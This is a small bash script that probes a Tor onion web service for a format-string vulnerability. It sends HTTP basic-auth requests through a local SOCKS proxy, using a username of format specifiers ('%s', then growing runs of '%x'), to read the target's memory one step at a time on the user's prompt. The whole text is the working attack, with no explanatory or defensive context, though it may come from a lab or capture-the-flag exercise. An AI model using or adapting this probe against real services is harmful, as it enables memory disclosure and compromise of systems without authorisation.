#!/bin/bash

string="%s"

curl -v -u "$string":password --socks5-hostname 127.0.0.1:9150 http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/;

while true; do
    read -p "Do you wish to check one memory location further? " yn
    case $yn in
        [Yy]* ) timeout 10 curl -v -u "$string":password --socks5-hostname 127.0.0.1:9150 http://xtfbiszfeilgi672ted7hmuq5v7v3zbitdrzvveg2qvtz4ar5jndnxad.onion/;;
        [Nn]* ) break;;
        * ) echo "Please answer yes or no.";;
    esac

    string="%x $string"; 
    echo -e "\n";
done

echo -e "\nLast given username: $string"
